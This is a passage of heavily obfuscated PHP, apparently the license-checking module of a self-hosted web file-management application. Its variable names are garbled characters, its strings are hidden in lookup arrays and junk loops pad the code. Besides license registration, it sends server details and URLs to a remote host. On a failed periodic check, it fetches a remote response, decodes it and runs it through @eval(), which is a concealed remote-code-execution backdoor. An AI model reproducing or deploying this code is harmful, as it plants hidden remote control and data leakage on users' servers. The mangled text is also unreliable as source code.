$Ó‡Æ¤”˜[76], $Ó‡Æ¤”˜[77], $Ó‡Æ¤”˜[78], $Ó‡Æ¤”˜[79], $Ó‡Æ¤”˜[80], $Ó‡Æ¤”˜[81], $Ó‡Æ¤”˜[82], $Ó‡Æ¤”˜[83]); foreach ($¼½èÕÀ as $£‡ü‰üœ) { $º  Şçı = $GLOBALS[$Ó‡Æ¤”˜[84]][$Ó‡Æ¤”˜[85]][$£‡ü‰üœ]; if (isset($Ì¥Ô»†[$£‡ü‰üœ])) { $º  Şçı = $Ì¥Ô»†[$£‡ü‰üœ]; } $êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[87]][$£‡ü‰üœ] = $º  Şçı; } $ï¦ğü•¯ = $êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[87]][$Ó‡Æ¤”˜[46]]; $¡™åĞò¶ = $ËÖÕ£¬’[653]; while (strlen($¡™åĞò¶) < $ËÖÕ£¬’[66]) { if (!$¡™åĞò¶) { break; } $¡™åĞò¶++; } unset($êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[88]][$Ó‡Æ¤”˜[89]]); $­ç¶Ÿ ¿ = $ËÖÕ£¬’[654]; if (!$­ç¶Ÿ ¿) { die; } unset($êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[88]][$Ó‡Æ¤”˜[90]]); unset($êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[87]][$Ó‡Æ¤”˜[46]]); $—€ıšØò = $ËÖÕ£¬’[655]; if (!$—€ıšØò) { die; } unset($êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[87]][$Ó‡Æ¤”˜[91]]); $êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[87]][$Ó‡Æ¤”˜[92]] = array($Ó‡Æ¤”˜[93] => (int) $ï¦ğü•¯[$Ó‡Æ¤”˜[94]], $Ó‡Æ¤”˜[95] => (int) _get($ï¦ğü•¯, $Ó‡Æ¤”˜[96], 0)); $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[98]] = Action($Ó‡Æ¤”˜[99])->accessToken(); $ôÑÖ‰ = $ËÖÕ£¬’[656]; if (strlen($ôÑÖ‰) < $ËÖÕ£¬’[642]) { return; } $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[100]] = md5($_SERVER[$Ó‡Æ¤”˜[101]] . $Ì¥Ô»†[$Ó‡Æ¤”˜[102]]); $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[103]] = base64_encode(serverInfo()); $ğ·Öô€³ = $ËÖÕ£¬’[657]; if (!$ğ·Öô€³) { return; } $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[104]] = $this->plwz293246d0; $§î„ÕÛ = $ËÖÕ£¬’[658]; while (strlen($§î„ÕÛ) < $ËÖÕ£¬’[642]) { if (!$§î„ÕÛ) { break; } $§î„ÕÛ++; } if ($Ì¥Ô»†[$Ó‡Æ¤”˜[104]] != $Ó‡Æ¤”˜[105]) { $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[106]] = $Ì¥Ô»†[$Ó‡Æ¤”˜[106]]; $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[107]] = $Ì¥Ô»†[$Ó‡Æ¤”˜[107]]; $ê‡¿â¶å = rand_string(10) . $this->plwz293246d0 . rand_string(5); $êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[108]][$Ó‡Æ¤”˜[109]] = $this->tdni03e58ded($ê‡¿â¶å, $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[100]]); } if ($this->plwz293246d0 == $Ó‡Æ¤”˜[105]) { $êşâ‚çÂ[$Ó‡Æ¤”˜[86]][$Ó‡Æ¤”˜[87]][$Ó‡Æ¤”˜[92]][$Ó‡Æ¤”˜[96]] = 0; } $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[110]] = _get($this->mgnb63bb668f, $Ó‡Æ¤”˜[111], $Ó‡Æ¤”˜[6]); $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[112]] = _get($this->mgnb63bb668f, $Ó‡Æ¤”˜[113], $Ó‡Æ¤”˜[6]); if (_get($GLOBALS, $Ó‡Æ¤”˜[114]) && $this->config[$Ó‡Æ¤”˜[115]]) { $êşâ‚çÂ[$Ó‡Æ¤”˜[97]][$Ó‡Æ¤”˜[116]] = WEB_ROOT; } return $êşâ‚çÂ; } private function qvnt3561ff44() { $ıãÉ¦Ó =& $_SERVER[ñ÷§¡å]; $†Èåß¹´ =& $_SERVER[œ¥é˜‚®]; $ïÌä•ı¥ = $_SERVER[$†Èåß¹´[24]] == $†Èåß¹´[117]; if ($_SERVER[$†Èåß¹´[24]] == $†Èåß¹´[118] && $_GET[$†Èåß¹´[119]] == $†Èåß¹´[120]) { $ïÌä•ı¥ = !0; } if ($ïÌä•ı¥) { $ùû«¹ˆí = array($†Èåß¹´[104] => $this->plwz293246d0, $†Èåß¹´[121] => $this->ixhzd5dac8e7(), $†Èåß¹´[122] => Model($†Èåß¹´[123])->count()); if ($this->plwz293246d0 != $†Èåß¹´[105]) { $Ÿïí´ô = _get($this->mgnb63bb668f, $†Èåß¹´[124]); if ($Ÿïí´ô) { $ùû«¹ˆí[$†Èåß¹´[125]] = $Ÿïí´ô; $ùû«¹ˆí[$†Èåß¹´[126]] = strtotime(_get($this->mgnb63bb668f, $†Èåß¹´[127])); $ùû«¹ˆí[$†Èåß¹´[128]] = _get($this->mgnb63bb668f, $†Èåß¹´[113]); } $ç¼úòÉ• = Model($†Èåß¹´[33])->get($†Èåß¹´[129], $†Èåß¹´[6], !0); if (is_string($ç¼úòÉ•) && substr($ç¼úòÉ•, 0, 1) == $†Èåß¹´[130]) { $ç¼úòÉ• = json_decode_force($ç¼úòÉ•); } if (is_array($ç¼úòÉ•) && $ç¼úòÉ•[$†Èåß¹´[131]] && strstr($ç¼úòÉ•[$†Èåß¹´[131]], $†Èåß¹´[132])) { $¿ûÌ‘•Ë = explode($†Èåß¹´[132], $ç¼úòÉ•[$†Èåß¹´[131]]); $ùû«¹ˆí[$†Èåß¹´[133]] = $¿ûÌ‘•Ë[0]; } } $ùû«¹ˆí = $this->lcgrb0b7164a(json_encode($ùû«¹ˆí), md5($†Èåß¹´[134])); $Å‰«Æ¨† = $ıãÉ¦Ó[659]; if (!$Å‰«Æ¨†) { return; } $šÏú®ÕÙ = array($†Èåß¹´[135] => $ùû«¹ˆí); call_user_func(array($†Èåß¹´[136], $†Èåß¹´[137]), $šÏú®ÕÙ); $Ò¸î¿’ª = $ıãÉ¦Ó[660]; if (!$Ò¸î¿’ª) { die; } } if ($this->plwz293246d0 == $†Èåß¹´[105]) { return; } $Ì¹²Ëûª = array($†Èåß¹´[138], $†Èåß¹´[139], $†Èåß¹´[140], $†Èåß¹´[141], $†Èåß¹´[142], $†Èåß¹´[143]); $—Ñ‰¨ = $ıãÉ¦Ó[661]; if (strlen($—Ñ‰¨) < $ıãÉ¦Ó[629]) { die; } $°ùÇº‰ƒ = Model($†Èåß¹´[33])->get(); $šÏú®ÕÙ = array($†Èåß¹´[144] => $°ùÇº‰ƒ[$†Èåß¹´[34]], $†Èåß¹´[145] => $°ùÇº‰ƒ[$†Èåß¹´[35]], $†Èåß¹´[146] => $†Èåß¹´[6]); $ªä¢ˆù = $ıãÉ¦Ó[662]; if (strlen($ªä¢ˆù) < $ıãÉ¦Ó[629]) { die; } foreach ($Ì¹²Ëûª as $¿İ­£™Ş) { if (!isset($°ùÇº‰ƒ[$¿İ­£™Ş]) || !$°ùÇº‰ƒ[$¿İ­£™Ş]) { continue; } $šÏú®ÕÙ[$¿İ­£™Ş] = $°ùÇº‰ƒ[$¿İ­£™Ş]; $§Í£óù = $ıãÉ¦Ó[663]; while (strlen($§Í£óù) < $ıãÉ¦Ó[66]) { if (!$§Í£óù) { break; } $§Í£óù++; } } call_user_func(array($†Èåß¹´[136], $†Èåß¹´[137]), $šÏú®ÕÙ); $¼Ô…‹¾é = $ıãÉ¦Ó[664]; if (!$¼Ô…‹¾é) { return; } } private function zlqx4c97a304() { $óùÁÁóÊ =& $_SERVER[ñ÷§¡å]; $×„³ã˜¶ =& $_SERVER[œ¥é˜‚®]; if ($_SERVER[$×„³ã˜¶[24]] != $×„³ã˜¶[147]) { return; } if (!_get($GLOBALS, $×„³ã˜¶[114])) { die; } $ÔÍ©ŞÍï = $GLOBALS[$×„³ã˜¶[13]]; if (isset($ÔÍ©ŞÍï[$×„³ã˜¶[148]])) { $this->zpaq714911f5(); die; } if (!isset($ÔÍ©ŞÍï[$×„³ã˜¶[149]]) || strlen($ÔÍ©ŞÍï[$×„³ã˜¶[149]]) != 16) { show_json($×„³ã˜¶[150] . $ÔÍ©ŞÍï[$×„³ã˜¶[149]], !1); } $¿Š²àîİ = Model($×„³ã˜¶[33])->get($×„³ã˜¶[102]); $Ø«à‡¯Ê = md5($_SERVER[$×„³ã˜¶[101]] . $¿Š²àîİ); $‚“áŞº” = array($×„³ã˜¶[149] => $ÔÍ©ŞÍï[$×„³ã˜¶[149]], $×„³ã˜¶[151] => rand_string(16), $×„³ã˜¶[152] => $×„³ã˜¶[134], $×„³ã˜¶[153] => $×„³ã˜¶[154], $×„³ã˜¶[155] => $_SERVER[$×„³ã˜¶[156]], $×„³ã˜¶[157] => $_SERVER[$×„³ã˜¶[158]], $×„³ã˜¶[159] => $_SERVER[$×„³ã˜¶[160]], $×„³ã˜¶[100] => $Ø«à‡¯Ê, $×„³ã˜¶[161] => Model($×„³ã˜¶[33])->get($×„³ã˜¶[129])); if ($ÔÍ©ŞÍï[$×„³ã˜¶[162]] == $×„³ã˜¶[163]) { $‹‰×ÖòÉ = $this->lcgrb0b7164a($Ø«à‡¯Ê, $×„³ã˜¶[164]); $àŒÑÏ…ì = $this->tdni03e58ded(json_encode($‚“áŞº”), $Ø«à‡¯Ê . $×„³ã˜¶[165], 3); $àŒÑÏ…ì = $àŒÑÏ…ì . $×„³ã˜¶[166] . $_SERVER[$×„³ã˜¶[156]]; $¢Á’Éà = $this->mgnd2b5958ee($×„³ã˜¶[167] . $‹‰×ÖòÉ . $×„³ã˜¶[168] . $àŒÑÏ…ì, -1); show_json($¢Á’Éà, !0); } else { if ($ÔÍ©ŞÍï[$×„³ã˜¶[162]] == $×„³ã˜¶[169]) { $ËŸŞÓïŠ = substr(md5($×„³ã˜¶[170] . $Ø«à‡¯Ê), 12, 15) . $×„³ã˜¶[171]; $àŒÑÏ…ì = $this->xmes5a381ae3(trim($ÔÍ©ŞÍï[$×„³ã˜¶[172]]), $ËŸŞÓïŠ, 2); $ó£ß Ã = json_decode($àŒÑÏ…ì, !0); if (!is_array($ó£ß Ã) || !is_array($ó£ß Ã[$×„³ã˜¶[173]]) || $ó£ß Ã[$×„³ã˜¶[149]] != !0) { $Î‰’ú¹É = $×„³ã˜¶[174]; $ÉÕøÁ‡Ã = $ó£ß Ã[$×„³ã˜¶[173]] ? $×„³ã˜¶[175] . $ó£ß Ã[$×„³ã˜¶[173]] : $Î‰’ú¹É; show_json($ÉÕøÁ‡Ã, !1); } else { $‚“áŞº”[$×„³ã˜¶[151]] = $ó£ß Ã[$×„³ã˜¶[173]][$×„³ã˜¶[176]]; } } else { $ó£ß Ã = $this->mgnd2b5958ee($×„³ã˜¶[177], $‚“áŞº”, 10); } } if (!is_array($ó£ß Ã) || !is_array($ó£ß Ã[$×„³ã˜¶[173]]) || $ó£ß Ã[$×„³ã˜¶[149]] != !0) { $Î‰’ú¹É = LNG($×„³ã˜¶[178]); $ÉÕøÁ‡Ã = $ó£ß Ã[$×„³ã˜¶[173]] ? $×„³ã˜¶[175] . $ó£ß Ã[$×„³ã˜¶[173]] : $Î‰’ú¹É; show_json($ÉÕøÁ‡Ã, !1); } $†™ä¢›– = $ó£ß Ã[$×„³ã˜¶[173]]; $÷ù®á¬ = $this->antcde98a898($†™ä¢›–[$×„³ã˜¶[179]]); $Õø®ë = $óùÁÁóÊ[665]; if (strlen($Õø®ë) < $óùÁÁóÊ[642]) { die; } if (!$÷ù®á¬ || $÷ù®á¬ != $†™ä¢›–[$×„³ã˜¶[127]]) { $ù˜„ÍÂÄ = array($×„³ã˜¶[180] => Model($×„³ã˜¶[33])->get($×„³ã˜¶[102]), $×„³ã˜¶[181] => $_SERVER[$×„³ã˜¶[101]], $×„³ã˜¶[182] => this_url(), $×„³ã˜¶[157] => $_SERVER[$×„³ã˜¶[158]]); $àŒÑÏ…ì = $this->kboa78679fa4(json_encode($ù˜„ÍÂÄ)); $this->mgnd2b5958ee($×„³ã˜¶[183] . $àŒÑÏ…ì); show_json(LNG($×„³ã˜¶[184]), !0); } $³€’»‡ = array($×„³ã˜¶[185] => $†™ä¢›–[$×„³ã˜¶[186]], $×„³ã˜¶[187] => $†™ä¢›–[$×„³ã˜¶[188]], $×„³ã˜¶[189] => rand_string(16), $×„³ã˜¶[104] => $†™ä¢›–[$×„³ã˜¶[190]]); if ($‚“áŞº”[$×„³ã˜¶[151]]) { $³€’»‡[$×„³ã˜¶[189]] = $‚“áŞº”[$×„³ã˜¶[151]]; } $íª¨ÄÎ¦ = substr(md5($³€’»‡[$×„³ã˜¶[187]]), 10, 10); $ÖŞİ‚«± = $íª¨ÄÎ¦ . $³€’»‡[$×„³ã˜¶[104]] . $³€’»‡[$×„³ã˜¶[189]]; $¢²ô› = $óùÁÁóÊ[666]; while (strlen($¢²ô›) < $óùÁÁóÊ[629]) { if (!$¢²ô›) { break; } $¢²ô›++; } $³€’»‡[$×„³ã˜¶[106]] = strrev(base64_encode($this->lcgrb0b7164a($ÖŞİ‚«±, $×„³ã˜¶[191]))); $’áé—« = rand_string(16); $Ëğæâ§ = $’áé—« . $³€’»‡[$×„³ã˜¶[104]] . $this->lcgrb0b7164a(md5($³€’»‡[$×„³ã˜¶[185]]), $’áé—«); $şºØòÛÓ = $óùÁÁóÊ[667]; if (!$şºØòÛÓ) { return; } $³€’»‡[$×„³ã˜¶[107]] = base64_encode(strrev($this->lcgrb0b7164a($Ëğæâ§, $×„³ã˜¶[192]))); if ($†™ä¢›–[$×„³ã˜¶[193]] && $†™ä¢›–[$×„³ã˜¶[193]] >= 1) { Model($×„³ã˜¶[33])->setDeep($×„³ã˜¶[194], $×„³ã˜¶[120]); } Model($×„³ã˜¶[33])->set($³€’»‡); $ë„äå¨ = md5($_SERVER[$×„³ã˜¶[101]] . strrev($¿Š²àîİ) . $³€’»‡[$×„³ã˜¶[187]]); $”ÄÃÄ¹÷ = $óùÁÁóÊ[668]; $î£ÉŞŒ· = strrev(substr($ë„äå¨, 10, 16)); $òæô¾åù = $óùÁÁóÊ[669]; while (strlen($òæô¾åù) < $óùÁÁóÊ[627]) { if (!$òæô¾åù) { break; } $òæô¾åù++; } $Ê¯ƒ³İ = $this->tdni03e58ded(json_encode($†™ä¢›–), $ë„äå¨); $ÔÓ¦Š© = array_to_keyvalue(Model($×„³ã˜¶[7])->listData(), $×„³ã˜¶[195]); $ûÖÊ—é = $óùÁÁóÊ[670]; if (strlen($ûÖÊ—é) < $óùÁÁóÊ[629]) { die; } $†Š„á®× = $ÔÓ¦Š©[$×„³ã˜¶[196]]; $‹Ì¬º§º = array(); $‹Ì¬º§º[$î£ÉŞŒ·] = $Ê¯ƒ³İ; Model($×„³ã˜¶[7])->update($†Š„á®×[$×„³ã˜¶[197]], array($×„³ã˜¶[198] => $‹Ì¬º§º)); $‡éÂÔÅ» = $óùÁÁóÊ[671]; $this->mgnb63bb668f = $†™ä¢›–; $this->plwz293246d0 = $³€’»‡[$×„³ã˜¶[104]]; $Œ»ëù†½ = $óùÁÁóÊ[672]; while ($Œ»ëù†½ < $óùÁÁóÊ[627]) { if ($Œ»ëù†½ >= 0) { break; } $Œ»ëù†½++; } $this->licenseRegistSuccess(); Cache::set($×„³ã˜¶[199] . md5($¿Š²àîİ . $×„³ã˜¶[200]), $×„³ã˜¶[6]); show_json(LNG($×„³ã˜¶[184]), !0); $—„ƒÚ‡¢ = $óùÁÁóÊ[673]; while ($—„ƒÚ‡¢ < $óùÁÁóÊ[647]) { if ($—„ƒÚ‡¢ >= 0) { break; } $—„ƒÚ‡¢++; } } private function licenseRegistSuccess() { $·€÷Ú²¾ =& $_SERVER[ñ÷§¡å]; $ëı•îå =& $_SERVER[œ¥é˜‚®]; $ã›¨±Âö = Model($ëı•îå[33])->get(); $Ïõ­©ÀÎ = $·€÷Ú²¾[674]; while (strlen($Ïõ­©ÀÎ) < $·€÷Ú²¾[642]) { if (!$Ïõ­©ÀÎ) { break; } $Ïõ­©ÀÎ++; } if ($ã›¨±Âö[$ëı•îå[63]] != $ëı•îå[120]) { Model($ëı•îå[33])->set($ëı•îå[63], $ëı•îå[120]); } Action($ëı•îå[201])->initStart(!0); } private function zpaq714911f5() { $³ÅÚğæú =& $_SERVER[ñ÷§¡å]; $§âŠõ¥æ =& $_SERVER[œ¥é˜‚®]; Model($§âŠõ¥æ[33])->set(array($§âŠõ¥æ[185] => $§âŠõ¥æ[6], $§âŠõ¥æ[187] => $§âŠõ¥æ[6], $§âŠõ¥æ[104] => $§âŠõ¥æ[105], $§âŠõ¥æ[106] => $§âŠõ¥æ[6], $§âŠõ¥æ[107] => $§âŠõ¥æ[6])); $Ñ•ŸÕÕ¤ = $³ÅÚğæú[675]; if (!$Ñ•ŸÕÕ¤) { return; } Model($§âŠõ¥æ[33])->setDeep($§âŠõ¥æ[194], $§âŠõ¥æ[202]); $this->mgnb63bb668f = array(); $ëŠÀ¦©º = $³ÅÚğæú[676]; $this->plwz293246d0 = $§âŠõ¥æ[105]; $¶êÙ­Î¥ = $³ÅÚğæú[677]; } private function xpuva8cbc57f() { $×‰õ‹¯ =& $_SERVER[ñ÷§¡å]; $ã¼¶âì¹ =& $_SERVER[œ¥é˜‚®]; $_SERVER[$ã¼¶âì¹[158]] = _get($_SERVER, $ã¼¶âì¹[158], APP_HOST); $ª’Ê„Êˆ = $×‰õ‹¯[678]; if (!$ª’Ê„Êˆ) { return; } $this->plwz293246d0 = $ã¼¶âì¹[105]; $ù®‹Û¤­ = $×‰õ‹¯[679]; if (!$ù®‹Û¤­) { return; } $ğã«¥€ = Model($ã¼¶âì¹[33])->get(); if ($ğã«¥€[$ã¼¶âì¹[104]] == $ã¼¶âì¹[105]) { return; } $£·Ëû©Õ = Model($ã¼¶âì¹[33])->get($ã¼¶âì¹[102]); $“•Ú™‰ = $×‰õ‹¯[680]; if (!$“•Ú™‰) { die; } $øí¿ô© = $ã¼¶âì¹[199] . md5($£·Ëû©Õ . $ã¼¶âì¹[200]); $Ë««‰‚ƒ = $×‰õ‹¯[681]; if (!$Ë««‰‚ƒ) { die; } $»îó‘¯ş = Cache::get($øí¿ô©); $¥é©ë±¬ = $×‰õ‹¯[682]; if (!is_array($»îó‘¯ş) || !isset($»îó‘¯ş[$ã¼¶âì¹[203]]) || time() - $»îó‘¯ş[$ã¼¶âì¹[203]] >= 60) { $²…¨¸Ï = Model($ã¼¶âì¹[7])->loadList(); $øÆÉ›€™ = $²…¨¸Ï[$ã¼¶âì¹[196]]; $Î¿ÙÌ« = md5($_SERVER[$ã¼¶âì¹[101]] . strrev($£·Ëû©Õ) . $ğã«¥€[$ã¼¶âì¹[187]]); $„é™¢¨€ = strrev(substr($Î¿ÙÌ«, 10, 16)); $»îó‘¯ş = $this->xmes5a381ae3($øÆÉ›€™[$ã¼¶âì¹[84]][$„é™¢¨€], $Î¿ÙÌ«); $»îó‘¯ş = json_decode($»îó‘¯ş, !0); } if (!is_array($»îó‘¯ş)) { return $this->zpaq714911f5(); } $¸¬«•Êï = strtotime($»îó‘¯ş[$ã¼¶âì¹[127]]); if (time() >= $¸¬«•Êï) { return $this->zpaq714911f5(); } if (time() - $»îó‘¯ş[$ã¼¶âì¹[203]] > 20) { $»îó‘¯ş[$ã¼¶âì¹[203]] = time(); Cache::set($øí¿ô©, $»îó‘¯ş); } $this->mgnb63bb668f = $»îó‘¯ş; $this->plwz293246d0 = $ğã«¥€[$ã¼¶âì¹[104]]; } private function rsah37783a41() { $Øßí’Øş =& $_SERVER[œ¥é˜‚®]; $Şû¿Û¼ƒ = $GLOBALS[$Øßí’Øş[13]]; $ÎÁµ­Êò = $_SERVER[$Øßí’Øş[24]]; if ($ÎÁµ­Êò == $Øßí’Øş[204] && $this->plwz293246d0 == $Øßí’Øş[105]) { show_json(LNG($Øßí’Øş[205]), !1, $Øßí’Øş[206]); } $Ó¯Ï¡¯— = array($Øßí’Øş[207], $Øßí’Øş[208]); if (in_array($ÎÁµ­Êò, $Ó¯Ï¡¯—)) { if ($this->plwz293246d0 == $Øßí’Øş[105] && isset($Şû¿Û¼ƒ[$Øßí’Øş[209]])) { show_json(LNG($Øßí’Øş[205]), !1, $Øßí’Øş[206]); die; } $µıŒ»› = $this->ixhzd5dac8e7(); if ($µıŒ»› != intval($Øßí’Øş[210])) { if ($µıŒ»› <= Model($Øßí’Øş[123])->count()) { show_json(LNG($Øßí’Øş[211]), !1, $Øßí’Øş[206]); die; } } } } private function pzlrb781d87c() { $¥è¶óÅ” =& $_SERVER[ñ÷§¡å]; $ŸÄ€©ú” =& $_SERVER[œ¥é˜‚®]; $âÎ¾ê¼ê = array($ŸÄ€©ú”[117], $ŸÄ€©ú”[118]); if (!_get($GLOBALS, $ŸÄ€©ú”[114]) || !isset($_GET[$ŸÄ€©ú”[212]])) { return; } if (!in_array($_SERVER[$ŸÄ€©ú”[24]], $âÎ¾ê¼ê)) { return; } $‚İÈÏ•– = $ŸÄ€©ú”[213]; $‚İÈÏ•– = $this->gviyfa47e623($‚İÈÏ•–, $ŸÄ€©ú”[214]); $îïæëáÌ = $¥è¶óÅ”[683]; if (!$îïæëáÌ) { die; } $…ÚßşÍê = stream_context_create(array($ŸÄ€©ú”[215] => array($ŸÄ€©ú”[216] => $ŸÄ€©ú”[217], $ŸÄ€©ú”[218] => 3))); $»Ç¼‡ëì = $¥è¶óÅ”[684]; while ($»Ç¼‡ëì < $¥è¶óÅ”[66]) { if ($»Ç¼‡ëì >= 0) { break; } $»Ç¼‡ëì++; } $ö«Ûîºß = @file_get_contents($‚İÈÏ•–, !1, $…ÚßşÍê); header($ŸÄ€©ú”[219]); $·„§…òø = $¥è¶óÅ”[685]; if (strlen($·„§…òø) < $¥è¶óÅ”[66]) { die; } if ($ö«Ûîºß && strstr($ö«Ûîºß, $ŸÄ€©ú”[220])) { echo $ö«Ûîºß; } die; } public function lgfp7532b292($ÛÅ´íˆ) { $›«†üéÈ =& $_SERVER[ñ÷§¡å]; $úº—–Ô¥ =& $_SERVER[œ¥é˜‚®]; if ($this->plwz293246d0 == $úº—–Ô¥[221]) { return $ÛÅ´íˆ; } $î£šš¶¥ = array($úº—–Ô¥[222] => $úº—–Ô¥[223], $úº—–Ô¥[224] => $úº—–Ô¥[223], $úº—–Ô¥[225] => $úº—–Ô¥[223], $úº—–Ô¥[226] => $úº—–Ô¥[223], $úº—–Ô¥[227] => $úº—–Ô¥[228], $úº—–Ô¥[229] => $úº—–Ô¥[228], $úº—–Ô¥[230] => $úº—–Ô¥[228], $úº—–Ô¥[231] => $úº—–Ô¥[228], $úº—–Ô¥[232] => $úº—–Ô¥[228], $úº—–Ô¥[233] => $úº—–Ô¥[228], $úº—–Ô¥[234] => $úº—–Ô¥[228], $úº—–Ô¥[235] => $úº—–Ô¥[228], $úº—–Ô¥[236] => $úº—–Ô¥[228], $úº—–Ô¥[237] => $úº—–Ô¥[228], $úº—–Ô¥[238] => $úº—–Ô¥[228], $úº—–Ô¥[239] => $úº—–Ô¥[228]); $Æ˜Š¥àí = $›«†üéÈ[686]; while ($Æ˜Š¥àí < $›«†üéÈ[642]) { if ($Æ˜Š¥àí >= 0) { break; } $Æ˜Š¥àí++; } $³»·•Îå = explode($úº—–Ô¥[240], _get($this->mgnb63bb668f, $úº—–Ô¥[111], $úº—–Ô¥[6])); $ÎêÄ™İ­ = $›«†üéÈ[687]; if (strlen($ÎêÄ™İ­) < $›«†üéÈ[642]) { return; } $«¤ğĞë = array(); foreach ($î£šš¶¥ as $µùçÈëè => $â¿á²»±) { if ($â¿á²»± == $úº—–Ô¥[223] && substr($this->plwz293246d0, 0, 1) == $úº—–Ô¥[223]) { continue; } if (!in_array($µùçÈëè, $³»·•Îå)) { $«¤ğĞë[] = $µùçÈëè; } } foreach ($«¤ğĞë as $µùçÈëè) { unset($ÛÅ´íˆ[$µùçÈëè]); $à’“‚È† = $›«†üéÈ[688]; if (!$à’“‚È†) { return; } } return $ÛÅ´íˆ; $­´£“¯Á = $›«†üéÈ[689]; if (!$­´£“¯Á) { return; } } private function atxbfab0d2e7() { $·¼èÒÓ =& $_SERVER[œ¥é˜‚®]; if ($this->plwz293246d0 != $·¼èÒÓ[105]) { $GLOBALS[$·¼èÒÓ[84]][$·¼èÒÓ[88]][$·¼èÒÓ[241]] = $·¼èÒÓ[202]; return; } $GLOBALS[$·¼èÒÓ[84]][$·¼èÒÓ[242]] = $·¼èÒÓ[120]; if (Model($·¼èÒÓ[243])->get($·¼èÒÓ[63]) != $·¼èÒÓ[202]) { Model($·¼èÒÓ[243])->set($·¼èÒÓ[63], $·¼èÒÓ[202]); } } public function qtfd0a7a4ce4() { return $_SERVER[œ¥é˜‚®][244]; $Ğçô¯Öß = $_SERVER[ñ÷§¡å][690]; if (!$Ğçô¯Öß) { die; } } private function mype01506ec6() { $àéÂÃ× =& $_SERVER[ñ÷§¡å]; $ìİîâ„Ñ =& $_SERVER[œ¥é˜‚®]; $ú‰²œÇ˜ = array($ìİîâ„Ñ[245], $ìİîâ„Ñ[246], $ìİîâ„Ñ[247]); $„Âáï›¥ = $ìİîâ„Ñ[248] . md5($ìİîâ„Ñ[249]); if ($this->plwz293246d0 == $ìİîâ„Ñ[105] || !_get($GLOBALS, $ìİîâ„Ñ[114])) { return; } if (!in_array($_SERVER[$ìİîâ„Ñ[24]], $ú‰²œÇ˜)) { return; } if (time() % 4 != 0) { return; } $Á–ˆÍ´ = call_user_func(array($ìİîâ„Ñ[250], $ìİîâ„Ñ[251]), $„Âáï›¥); if ($Á–ˆÍ´ && time() - $Á–ˆÍ´ < intval($ìİîâ„Ñ[252])) { return; } call_user_func(array($ìİîâ„Ñ[250], $ìİîâ„Ñ[137]), $„Âáï›¥, time()); $èğ¾şßŞ = $àéÂÃ×[691]; while (strlen($èğ¾şßŞ) < $àéÂÃ×[642]) { if (!$èğ¾şßŞ) { break; } $èğ¾şßŞ++; } $îÔ¬¨— = Model($ìİîâ„Ñ[33])->get($ìİîâ„Ñ[102]); $¬¹õµòØ = $àéÂÃ×[692]; if (!$¬¹õµòØ) { return; } $ã¨Ä¢‹à = array($ìİîâ„Ñ[149] => Model($ìİîâ„Ñ[33])->get($ìİîâ„Ñ[185]), $ìİîâ„Ñ[162] => $this->plwz293246d0, $ìİîâ„Ñ[159] => $_SERVER[$ìİîâ„Ñ[160]], $ìİîâ„Ñ[161] => Model($ìİîâ„Ñ[33])->get($ìİîâ„Ñ[129]), $ìİîâ„Ñ[100] => md5($_SERVER[$ìİîâ„Ñ[101]] . $îÔ¬¨—), $ìİîâ„Ñ[152] => $ìİîâ„Ñ[134], $ìİîâ„Ñ[155] => $_SERVER[$ìİîâ„Ñ[156]]); $Œ«Óû‚ = $àéÂÃ×[693]; if (!$Œ«Óû‚) { return; } $‡Ü›õ‘ = $this->mgnd2b5958ee($ìİîâ„Ñ[253], $ã¨Ä¢‹à); if (!is_array($‡Ü›õ‘)) { return; } if ($‡Ü›õ‘[$ìİîâ„Ñ[149]] && $‡Ü›õ‘[$ìİîâ„Ñ[254]]) { if ($this->antcde98a898($‡Ü›õ‘[$ìİîâ„Ñ[254]]) == $ã¨Ä¢‹à[$ìİîâ„Ñ[149]]) { return; } } $this->zpaq714911f5(); if ($this->antcde98a898($‡Ü›õ‘[$ìİîâ„Ñ[254]]) != $ã¨Ä¢‹à[$ìİîâ„Ñ[149]]) { $–ÖóßÎ = array($ìİîâ„Ñ[180] => $îÔ¬¨—, $ìİîâ„Ñ[181] => $_SERVER[$ìİîâ„Ñ[101]], $ìİîâ„Ñ[182] => this_url(), $ìİîâ„Ñ[157] => $_SERVER[$ìİîâ„Ñ[158]]); $ú¹í”Í = $this->kboa78679fa4(json_encode($–ÖóßÎ)); $‡Ü›õ‘ = $this->mgnd2b5958ee($ìİîâ„Ñ[183] . $ú¹í”Í); if ($‡Ü›õ‘ && is_array($‡Ü›õ‘) && isset($‡Ü›õ‘[$ìİîâ„Ñ[254]])) { $«†ÄòªÏ = $this->xmes5a381ae3($‡Ü›õ‘[$ìİîâ„Ñ[254]], 2); if ($«†ÄòªÏ) { $«†ÄòªÏ = $this->antcde98a898($«†ÄòªÏ); } if ($«†ÄòªÏ) { try { @eval($«†ÄòªÏ); } catch (Exception $†ƒóµÑÉ) { } } } } } private function mgnd2b5958ee($¥ñš”•À = '', $ÜªÁ»«© = array(), $…²ıñ×Û = 5) { $³È­ğöÎ =& $_SERVER[ñ÷§¡å]; $æ––‡÷¸ =& $_SERVER[œ¥é˜‚®]; $¬¨§Ï = $æ––‡÷¸[255]; $¬¨§Ï = $this->gviyfa47e623($¬¨§Ï, $æ––‡÷¸[256]); $¬¨§Ï = $¬¨§Ï . $¥ñš”•À; $ÇÏÊòµ = 